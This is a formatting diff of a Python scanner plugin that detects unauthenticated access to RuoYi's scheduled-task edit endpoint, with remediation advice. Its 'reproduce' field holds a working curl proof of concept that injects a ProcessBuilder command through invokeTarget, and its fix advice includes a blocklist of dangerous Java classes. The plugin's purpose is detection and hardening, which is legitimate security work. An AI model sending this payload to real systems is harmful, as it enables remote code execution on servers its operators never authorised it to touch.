@@ -1,82 +1,81 @@
 # 定时任务 RCE：未授权访问 /monitor/job/edit 接口存在性判定（不执行实际 RCE）
-from plugins.base import PluginBase
-from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
-from lib.colors import ok, no
+from core.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
+from lib.colors import no, ok
 from lib.http import join_url
 from lib.matcher import match_positive
+from plugins.base import PluginBase
 
 
 class JobRcePlugin(PluginBase):
-    name = '定时任务 RCE（未授权访问）'
-    cve = 'N/A'
-    severity = 'high'
-    category = 'vuln'
+    name = "定时任务 RCE（未授权访问）"
+    cve = "N/A"
+    severity = "high"
+    category = "vuln"
     description = (
-        '若依 /monitor/job/edit 接口未授权可访问：攻击者可编辑 invokeTarget 触发 RCE。'
-        '本插件仅验证编辑接口未鉴权，不实际修改任务或触发执行（agents.md §7 安全合规）'
+        "若依 /monitor/job/edit 接口未授权可访问：攻击者可编辑 invokeTarget 触发 RCE。"
+        "本插件仅验证编辑接口未鉴权，不实际修改任务或触发执行（agents.md §7 安全合规）"
     )
     fix = (
-        '强制 /monitor/job/** 鉴权；白名单校验 invokeTarget 调用目标，禁止 ruoYiConfig 等敏感方法；'
-        '后台路径接入统一鉴权框架'
+        "强制 /monitor/job/** 鉴权；白名单校验 invokeTarget 调用目标，禁止 ruoYiConfig 等敏感方法；"
+        "后台路径接入统一鉴权框架"
     )
     fix_detail = (
-        '【权限加固】为 /monitor/job/** 路径添加 @PreAuthorize("@ss.hasPermi(\'monitor:job:list\')")\n'
-        '【代码修复】SysJobController.edit() 添加 invokeTarget 白名单校验：\n'
+        "【权限加固】为 /monitor/job/** 路径添加 @PreAuthorize(\"@ss.hasPermi('monitor:job:list')\")\n"
+        "【代码修复】SysJobController.edit() 添加 invokeTarget 白名单校验：\n"
         '  String[] blacklist = {"ruoYiConfig","java.lang.Runtime","java.lang.ProcessBuilder"};\n'
         '  for (String s : blacklist) { if (invokeTarget.contains(s)) throw new ServiceException("非法调用目标"); }\n'
-        '【升级方案】升级 RuoYi 至 4.7.0+（该版本对 invokeTarget 做了白名单校验）\n'
-        '【配置加固】quartz.properties 限制 JobDataMap 可序列化类：org.quartz.jobStore.allowNonManagedTxInJDBC=false\n'
-        '【WAF 规则】拦截 /monitor/job/edit 的 POST 请求含 invokeTarget 参数\n'
-        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验'
+        "【升级方案】升级 RuoYi 至 4.7.0+（该版本对 invokeTarget 做了白名单校验）\n"
+        "【配置加固】quartz.properties 限制 JobDataMap 可序列化类：org.quartz.jobStore.allowNonManagedTxInJDBC=false\n"
+        "【WAF 规则】拦截 /monitor/job/edit 的 POST 请求含 invokeTarget 参数\n"
+        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验"
     )
     reproduce = (
-        '# 探测 /monitor/job/edit 是否未授权可访问（不修改任何任务）：\n'
+        "# 探测 /monitor/job/edit 是否未授权可访问（不修改任何任务）：\n"
         'curl -X POST "http://target/monitor/job/edit" \\\n'
         '  -d "jobId=99999&jobName=test&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile&cronExpression=0/10+*+*+*+*+?"\n'
-        '\n'
+        "\n"
         '# 预期响应（未授权可访问）：响应体含 "任务不存在" 类业务错误（而非登录页/401）\n'
-        '\n'
-        '# 实战利用（需 /monitor/job/edit 未鉴权，慎用，仅授权测试）：\n'
+        "\n"
+        "# 实战利用（需 /monitor/job/edit 未鉴权，慎用，仅授权测试）：\n"
         'curl -X POST "http://target/monitor/job/edit" \\\n'
-        '  -d "jobId=1&jobName=test&invokeTarget=org.springframework.cglib.core.ReflectUtils.invokeFn(\'new java.lang.ProcessBuilder(new String[]{\'id\'}).start()\'\n'
-        '  # 该 PoC 会触发 RCE，仅在授权靶场验证'
+        "  -d \"jobId=1&jobName=test&invokeTarget=org.springframework.cglib.core.ReflectUtils.invokeFn('new java.lang.ProcessBuilder(new String[]{'id'}).start()'\n"
+        "  # 该 PoC 会触发 RCE，仅在授权靶场验证"
     )
     # D2：/monitor/job/edit 白名单在 4.7.0 收紧
-    affected_versions = '>=4.0,<4.7'
+    affected_versions = ">=4.0,<4.7"
     # D12：CVSS v3.1 + 合规映射
-    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
-    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
+    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
     # D7: WAF 绕过支持
-    vuln_type = 'rce'
+    vuln_type = "rce"
     supports_waf_bypass = True
 
     # 鉴权拦截关键字（命中即视为接口受保护，判 SAFE）
-    AUTH_BLOCK_KEYWORDS = ['登录', '请先登录', 'unauthorized', '认证失败', '无法访问系统资源', 'signin', 'login']
+    AUTH_BLOCK_KEYWORDS = ["登录", "请先登录", "unauthorized", "认证失败", "无法访问系统资源", "signin", "login"]
 
     def verify(self, target, session):
-        url = join_url(target, 'monitor/job/edit')
+        url = join_url(target, "monitor/job/edit")
         # 用不存在的 jobId 探测：若未鉴权，服务端会进入业务校验返回「任务不存在」类响应
         # 若已鉴权，服务端在拦截器层即返回登录重定向/401（不会进入业务逻辑）
         # 该探测不会修改任何真实任务（jobId=99999 通常不存在）
         data = {
-            'jobId': '99999',
-            'jobName': 'ruoyi_scan_probe',
-            'jobGroup': 'DEFAULT',
-            'invokeTarget': 'ryTask.ryParams(\'ry\'',
-            'cronExpression': '0/10 * * * * ?',
-            'misfirePolicy': '1',
-            'concurrent': '1',
-            'status': '1',
+            "jobId": "99999",
+            "jobName": "ruoyi_scan_probe",
+            "jobGroup": "DEFAULT",
+            "invokeTarget": "ryTask.ryParams('ry'",
+            "cronExpression": "0/10 * * * * ?",
+            "misfirePolicy": "1",
+            "concurrent": "1",
+            "status": "1",
         }
         try:
             resp = session.post(url, data=data)
         except Exception as e:
-            print(no('定时任务 RCE（网络异常）'))
-            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
-                              url=url, evidence=str(e))
+            print(no("定时任务 RCE（网络异常）"))
+            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
 
-        text = resp.text or ''
-        code = getattr(resp, 'status_code', 0)
+        text = resp.text or ""
+        code = getattr(resp, "status_code", 0)
 
         # 解析 JSON 响应（RuoYi AjaxResult 通常含 code/msg）
         is_json = False
@@ -89,57 +88,76 @@ class JobRcePlugin(PluginBase):
 
         # 1) 若响应含鉴权拦截关键字 → 接口已保护，判 SAFE（使用 match_positive 统一降误报）
         if match_positive(text, self.AUTH_BLOCK_KEYWORDS):
-            print(no('不存在定时任务 RCE 漏洞（编辑接口已鉴权）'))
-            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
-                              evidence=f'响应含鉴权拦截关键字：{text[:200]}')
+            print(no("不存在定时任务 RCE 漏洞（编辑接口已鉴权）"))
+            return ScanResult(
+                kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=f"响应含鉴权拦截关键字：{text[:200]}"
+            )
 
         # 2) HTTP 状态码 401/403 → 鉴权拦截（无论响应是否为 JSON）
         if code in (401, 403):
-            print(no(f'不存在定时任务 RCE 漏洞（HTTP {code} 鉴权拦截）'))
-            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
-                              evidence=f'HTTP {code} 鉴权拦截')
+            print(no(f"不存在定时任务 RCE 漏洞（HTTP {code} 鉴权拦截）"))
+            return ScanResult(
+                kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=f"HTTP {code} 鉴权拦截"
+            )
 
         # 3) JSON 响应且 code 表示进入了业务层
         #    - code == 200：通常表示操作成功（极端情况：未鉴权且 jobId 真的存在并修改成功，严重）
         #    - code == 500：业务校验失败（如「定时任务不存在」），证明已绕过鉴权进入业务层
         #    - code == 401/403：鉴权失败（已在第 2 步兜底）
         if is_json:
-            r_code = body.get('code')
-            msg = str(body.get('msg', ''))
+            r_code = body.get("code")
+            msg = str(body.get("msg", ""))
             # 鉴权失败码（JSON body 内的 code）
             if r_code in (401, 403):
-                print(no(f'不存在定时任务 RCE 漏洞（接口已鉴权，JSON code={r_code}）'))
-                return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
-                                  evidence=f'code={r_code} msg={msg}')
+                print(no(f"不存在定时任务 RCE 漏洞（接口已鉴权，JSON code={r_code}）"))
+                return ScanResult(
+                    kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=f"code={r_code} msg={msg}"
+                )
             # 业务层响应（200 成功 / 500 任务不存在）→ 绕过鉴权，存在未授权访问
             # 注意：仅 code==200/500 判 CONFIRMED；其他业务码（400 参数错误等）不判，
             # 避免「r_code is not None」导致任意 JSON 响应均误报（P0 修复）
             if r_code in (200, 500):
-                print(ok('存在定时任务 RCE 漏洞（未授权访问编辑接口）'))
+                print(ok("存在定时任务 RCE 漏洞（未授权访问编辑接口）"))
                 return ScanResult(
-                    kind='vuln', name=self.name, severity=self.severity,
-                    status=STATUS_CONFIRMED, url=url,
-                    evidence=f'未鉴权进入业务层：code={r_code} msg={msg}',
-                    extra={'code': r_code, 'msg': msg},
+                    kind="vuln",
+                    name=self.name,
+                    severity=self.severity,
+                    status=STATUS_CONFIRMED,
+                    url=url,
+                    evidence=f"未鉴权进入业务层：code={r_code} msg={msg}",
+                    extra={"code": r_code, "msg": msg},
                     fix=self.fix,
                 )
             # 其他业务码（如 400 参数错误、404 等）：无法明确判定是否绕过鉴权，标 UNKNOWN
             # （不判 SAFE 避免漏报已修复但返回奇怪码的系统；也不判 CONFIRMED 避免误报）
-            print(no(f'定时任务 RCE：JSON code={r_code} 不在已知范围，判 UNKNOWN'))
-            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, url=url,
-                              evidence=f'JSON 业务码 {r_code} 不在 (200,500) 范围：{msg}')
+            print(no(f"定时任务 RCE：JSON code={r_code} 不在已知范围，判 UNKNOWN"))
+            return ScanResult(
+                kind="vuln",
+                name=self.name,
+                status=STATUS_UNKNOWN,
+                url=url,
+                evidence=f"JSON 业务码 {r_code} 不在 (200,500) 范围：{msg}",
+            )
 
         # 4) 非 JSON 响应但 HTTP 200 + 非鉴权关键字 → 可能是 HTML 编辑页（未授权渲染）
-        if code == 200 and not match_positive(text, ['login', 'signin', '登录']):
-            print(ok('存在定时任务 RCE 漏洞（未授权访问编辑页面）'))
+        if code == 200 and not match_positive(text, ["login", "signin", "登录"]):
+            print(ok("存在定时任务 RCE 漏洞（未授权访问编辑页面）"))
             return ScanResult(
-                kind='vuln', name=self.name, severity=self.severity,
-                status=STATUS_CONFIRMED, url=url,
-                evidence=f'HTTP 200 且无鉴权关键字，响应前 200 字节：{text[:200]}',
+                kind="vuln",
+                name=self.name,
+                severity=self.severity,
+                status=STATUS_CONFIRMED,
+                url=url,
+                evidence=f"HTTP 200 且无鉴权关键字，响应前 200 字节：{text[:200]}",
                 fix=self.fix,
             )
 
         # 5) 其他情形：无法明确判定（如非 200 的非 JSON 响应，且无关键字）
-        print(no('定时任务 RCE：响应特征不明确，判 UNKNOWN'))
-        return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, url=url,
-                          evidence=f'HTTP {code} 响应前 200 字节：{text[:200]}')
+        print(no("定时任务 RCE：响应特征不明确，判 UNKNOWN"))
+        return ScanResult(
+            kind="vuln",
+            name=self.name,
+            status=STATUS_UNKNOWN,
+            url=url,
+            evidence=f"HTTP {code} 响应前 200 字节：{text[:200]}",
+        )
